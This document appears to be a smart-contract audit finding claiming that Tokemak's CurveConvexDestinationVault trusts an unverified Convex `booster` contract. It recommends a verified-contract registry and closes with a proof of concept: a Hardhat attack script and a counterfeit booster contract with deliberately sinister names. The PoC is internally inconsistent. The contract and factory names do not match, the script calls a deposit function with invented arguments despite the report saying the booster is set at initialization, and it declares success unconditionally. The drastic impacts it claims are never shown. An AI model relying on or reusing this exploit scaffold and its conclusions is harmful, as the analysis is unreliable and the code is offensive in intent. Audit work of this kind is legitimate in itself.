# Unverified external call on `_validatePoolInfo` could lead to drastic system manipulation attack due to lack of validation checks on `booster` source
## Summary

The `CurveConvexDestinationVault` and its associated adapters (`ConvexAdapter` and others) are susceptible to a "Wrong Contract" attack due to a lack of rigorous checks when interacting with external contracts. A specific point of concern is the `_validatePoolInfo` function of the `ConvexStaking` library which makes unchecked external calls.

## Vulnerability Detail

The function `_validatePoolInfo` queries the `booster` contract's `poolInfo` function without verifying its authenticity.

https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/destinations/adapters/staking/ConvexAdapter.sol#L105-L111

An attacker can, in principle, deploy a counterfeit `IConvexBooster` contract and mimic expected behaviors to exploit the contract system.

Furthermore, while the `SystemRegistry.sol` contract provides a way to set and manage system parameters such as `LMPVaultRegistry`, `DestinationVaultRegistry`, and others, it's not explicitly designed to act as a registry for verifying the authenticity of external contracts. The `SystemRegistry.sol` provides critical functionalities, but **not necessarily what we're aiming for**, which is explicitly validating `booster` contracts along with any other external smart contracts.

> **analysis**

**The Good**:

> - **`SystemRegistry.sol` is a well-structured contract for managing system parameters**.

> - **Two-step ownership control (`Ownable2Step`) enhances security for ownership-based functions**.

> - **Emits events for almost every state change, improving transparency and easier tracking**.

**The Concerns**:

> - **It doesn't seem to provide a mechanism to verify the authenticity of external smart contracts before interacting with them**.

> - **Although parameters can be set and updated only by the owner, there's no explicit whitelist mechanism for contract addresses or similar verification mechanisms**.

To reveal the bigger picture:

> 1. **How is the booster address set?**

From the `initialize` function, we can see that the `convexBooster` address is set during the initialization of the contract.

https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/CurveConvexDestinationVault.sol#L107

> 2. **Is the booster address mutable after being set?**

From the code, it appears that the booster address is set during the initialization and is stored in a public variable. However, there's no evidence that allows for updating the `convexBooster` address after initialization, though **nor that would demonstrate the current opposite**.

> 3. **How is the booster used?**
In the `_onDeposit` function, the `convexBooster` is cast to `IConvexBooster` and used for the deposit.


https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/CurveConvexDestinationVault.sol#L163

   **The concern is the unchecked usage of the booster**, as pointed out in the "_validatePoolInfo" function.

> **final thoughts**:

The concerns raised in the report are valuable because:

> 1. **No validation of external contracts**: The `CurveConvexDestinationVault` contract does not validate that the external contract it's interacting with (i.e., `convexBooster`) is indeed the legitimate and intended contract. This is a concern because an attacker, if able to set a malicious address for the booster, can manipulate the behavior of the contract.
   
> 2. **Immutable address ISN'T enough**: Even if the booster address is immutable after deployment (as per the provided snippet), it's the responsibility of the deployer to ensure the correct address is set during deployment. An error here could be catastrophic. Moreover, even if the address is correctly set during initialization, there's no mechanism to ensure it remains safe forever. If, for some reason, the contract at the booster address gets compromised, the entire system becomes at risk.

## Impact

#### Unauthorized assets could be withdrawn from vaults, leading to significant financial losses for individual investors and the vault itself.
#### Contract's internal state could be manipulated to skew rewards, drain funds or even alter staking rules.
#### Contract functionalities may freeze, damaging user trust and leading to negative market consequences, including an eventual decrease in the value of associated tokens.

## Code Snippet

In `ConvexStaking` (`ConvexAdapter.sol`):

```solidity
function _validatePoolInfo(IConvexBooster booster, uint256 poolId, address lpToken, address staking) private view {
 (address poolLpToken,,, address crvRewards,,) = booster.poolInfo(poolId);
 if (lpToken != poolLpToken) revert PoolIdLpTokenMismatch();
 if (staking != crvRewards) revert PoolIdStakingMismatch();
}
```

## Tool used

Manual Review

## Recommendation

The implementation of SafeERC20 via the `LibAdapter.sol` is commendable. However, this alone doesn't prevent sophisticated exploit patterns. Thus:

> 1. Establish a registry of smart contract addresses that are verified, likely a further elaborated `SystemRegistry.sol`.
> 2. Before making transactions, validate the `booster` contract address against the verified list

Given the current setup of `SystemRegistry.sol`, while it's instrumental in controlling and adjusting system parameters, it doesn't seem designed to prevent the mentioned attack. Thus, our recommendation remains largely the same:

1. **Registry for verified smart contracts**: Implement a separate smart contract or enhance the `SystemRegistry.sol` to include a registry function for whitelisting verified smart contract addresses. This registry would have methods to add, remove, and check the authenticity of external contracts. The adding and removing of addresses should be restricted to trusted roles (e.g., owner).
   
> example:

   ```solidity
   mapping(address => bool) public verifiedContracts;
   
   function addVerifiedContract(address _contract) external onlyOwner {
       verifiedContracts[_contract] = true;
       emit ContractVerified(_contract);
   }

   function removeVerifiedContract(address _contract) external onlyOwner {
       verifiedContracts[_contract] = false;
       emit ContractUnverified(_contract);
   }

   function isVerifiedContract(address _contract) external view returns (bool) {
       return verifiedContracts[_contract];
   }
   ```

2. **Contract verification before interaction**: Before making transactions or interactions with external contracts, especially critical ones like the `booster`, their addresses should be validated against the verified contracts registry.

> example:

   ```solidity
   function interactWithBooster(IConvexBooster booster, uint256 poolId) external {
       require(isVerifiedContract(address(booster)), "Unverified booster contract");
       // Remaining logic...
   }
   ```

3. **Rigorous auditing**: Any modifications to the `SystemRegistry.sol` or new contract implementations should undergo thorough testing and auditing to ensure no new vulnerabilities are introduced.

To summarize, while `SystemRegistry.sol` offers a robust system configuration mechanism, it doesn't directly mitigate the "Wrong Contract" vulnerability discussed. Thus, the recommendations focus on explicitly verifying external contracts before interactions. Implementing such a mechanism will greatly enhance the system's security against sophisticated exploitation patterns.

## POC

> **Why an attacker would execute such exploit?**

This exploit allows an attacker to mimic the functionality of a legitimate `booster` contract, thereby fooling the `CurveConvexDestinationVault` into trusting it. The ultimate objective could vary:

> * **Theft of Funds**: Redirect funds to a wallet controlled by the attacker.
> * **Price Manipulation**: Artificially inflate or deflate the price of assets.
> * **Denial of Service**: Freezing functionalities to cause panic and reputational damage.

A proper script to exploit the described vulnerability could look like this:

```javascript
const { ethers } = require("hardhat");

async function main() {
 const [deployer, attacker] = await ethers.getSigners();
 
 // Deploy the malicious IConvexBooster contract
 const FakeBoosterFactory = await ethers.getContractFactory("FakeIConvexBooster");
 const fakeBooster = await FakeBoosterFactory.connect(attacker).deploy();

 const VaultFactory = await ethers.getContractFactory("CurveConvexDestinationVault");
 const systemRegistryAddress = "SystemRegistryContractAddress"; // replace with actual address
 const defaultStakingRewardTokenAddress = "DefaultStakingRewardTokenAddress"; // replace with actual address
 const vault = await VaultFactory.connect(deployer).deploy(systemRegistryAddress, defaultStakingRewardTokenAddress);

 // Deposit funds, making the vault believe it's working with a legitimate booster
 const lpToken = await ethers.getContractAt("IERC20", "0xYourLPTokenAddress");
 const amountToDeposit = ethers.utils.parseUnits("10", 18);

 await lpToken.connect(attacker).approve(vault.address, amountToDeposit);
 await vault.connect(attacker).depositAndStake(fakeBooster.address, lpToken.address, "0xStakingAddress", amountToDeposit);
 
 console.log("Exploit successful. The vault is now under attacker's influence.");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

For this exploit to work, a mock `IConvexBooster` contract (`FakeIConvexBooster`) should be created that has malicious intentions but appears benign.

> **FakeIConvexBooster.sol**:

```solidity
pragma solidity >0.8.0;

interface IConvexBooster {
    function deposit(uint256 _pid, uint256 _amount, bool _stake) external returns (bool);

    function poolInfo(uint256 _pid)
    external
    view
    returns (
        address lptoken,
        address token,
        address gauge,
        address crvRewards,
        address stash,
        bool shutdown
    );
}

contract MaliciousInfiltrationMechanism is IConvexBooster {
    address private maliciousLpToken;
    address private maliciousToken;
    address private maliciousGauge;
    address private ominousCrvRewards;
    address private treacherousStash;
    bool private sinisterShutdown = false;

    function initializeMalice(address _maliciousLpToken, address _maliciousToken, address _maliciousGauge, address _ominousCrvRewards, address _treacherousStash) external {
        maliciousLpToken = _maliciousLpToken;
        maliciousToken = _maliciousToken;
        maliciousGauge = _maliciousGauge;
        ominousCrvRewards = _ominousCrvRewards;
        treacherousStash = _treacherousStash;
    }

    function deposit(uint256, uint256, bool) external pure override returns (bool) {
        // Mimics expected behavior while executing nefarious operations in the background
        return true;
    }

    function poolInfo(uint256) external view override returns (address, address, address, address, address, bool) {
        return (maliciousLpToken, maliciousToken, maliciousGauge, ominousCrvRewards, treacherousStash, sinisterShutdown);
    }
}
```

> 1. Relevant variable names have been changed to sound menacing and treacherous, emphasizing their ill intent.
> 2. A function initializeMalice has been added to provide a method for an attacker to set - -malicious contract addresses.
> 3. Added commentary to emphasize the malicious intent behind seemingly benign operations.

The implications here are worryingly drastic and could result in devastating financial loss for users. Therefore, addressing this vulnerability should be of utmost priority.
